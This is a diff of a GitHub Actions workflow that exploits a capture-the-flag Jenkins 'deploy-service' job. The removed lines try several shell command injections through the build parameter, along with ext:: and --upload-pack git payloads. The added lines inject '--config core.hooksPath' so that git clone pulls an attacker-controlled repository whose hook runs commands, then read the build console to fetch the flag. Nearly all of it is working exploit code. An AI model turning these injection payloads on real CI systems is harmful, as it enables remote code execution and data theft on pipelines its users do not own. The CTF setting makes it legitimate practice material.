@@ -1,4 +1,4 @@
-name: CTF Exploit v2
+name: CTF Final Exploit
 on:
   push:
     branches: [ master ]
@@ -8,44 +8,44 @@ jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Get buildWithParameters form
+      - name: Get latest build number
         run: |
-          echo "=== GET /job/deploy-service/buildWithParameters ==="
-          curl -sk https://gitops.ctfchile.com/job/deploy-service/buildWithParameters
-          echo ""
-          echo "=== GET /job/deploy-service ==="
-          curl -sk https://gitops.ctfchile.com/job/deploy-service
+          echo "=== Current build list ==="
+          curl -sk https://gitops.ctfchile.com/job/deploy-service | grep -oP '#\d+' | head -5
 
-      - name: Exploit - bash injection via service param
+      - name: Exploit - --config hooksPath (exec hook on clone)
         run: |
-          echo "=== PAYLOAD 1: semicolon injection ==="
+          # The pipeline does: git clone https://github.com/pelicancorp/$SERVICE_NAME.git
+          # We inject: --config core.hooksPath=hooks.git https://github.com/chilectf/exploit
+          # chilectf/exploit has hooks.git/post-checkout that runs: cat /flag.txt >&2
+          echo "=== SENDING EXPLOIT ==="
+          PAYLOAD='--config core.hooksPath=hooks.git https://github.com/chilectf/exploit'
           curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode 'SERVICE=test; cat /flag.txt' | grep -E "flag|CTF|output|result|error|clone" | head -30
+            --data-urlencode "SERVICE_NAME=$PAYLOAD" \
+            -D - | tail -5
           echo ""
-          echo "=== PAYLOAD 2: newline injection ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            -d 'SERVICE=test%0acat+/flag.txt' | grep -E "flag|CTF|output|result" | head -30
-          echo ""
-          echo "=== PAYLOAD 3: pipe injection ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode 'SERVICE=test | cat /flag.txt' | grep -E "flag|CTF|output|result" | head -30
-          echo ""
-          echo "=== PAYLOAD 4: backtick injection ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode 'SERVICE=`cat /flag.txt`' | grep -E "flag|CTF|output|result" | head -30
+          echo "Sleeping 5s for build to complete..."
+          sleep 5
 
-      - name: Exploit - ext protocol
+      - name: Get console output of latest build
         run: |
-          echo "=== PAYLOAD 5: ext:: protocol ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode 'SERVICE=ext::sh -c cat /flag.txt >&2' | head -50
+          echo "=== Fetch latest build console ==="
+          # Get list to find new build number
+          PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
+          LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
+          echo "Latest build: #$LATEST"
           echo ""
-          echo "=== PAYLOAD 6: --upload-pack injection ==="
-          curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode 'SERVICE=--upload-pack=touch /tmp/pwned https://github.com/chilectf/exploit' | head -50
+          echo "=== Console output ==="
+          curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console"
 
-      - name: Full response - PAYLOAD 1
+      - name: Also try ext:: protocol
         run: |
-          echo "=== FULL RESPONSE semicolon ==="
+          echo "=== ext:: protocol ==="
           curl -sk -X POST "https://gitops.ctfchile.com/job/deploy-service/buildWithParameters" \
-            --data-urlencode 'SERVICE=x; cat /flag.txt'
+            --data-urlencode "SERVICE_NAME=ext::sh -c cat /flag.txt >&2" \
+            -D - | tail -5
+          sleep 5
+          PAGE=$(curl -sk https://gitops.ctfchile.com/job/deploy-service)
+          LATEST=$(echo "$PAGE" | grep -oP '/job/deploy-service/\K\d+(?=/console)' | sort -n | tail -1)
+          echo "Latest build: #$LATEST"
+          curl -sk "https://gitops.ctfchile.com/job/deploy-service/$LATEST/console"
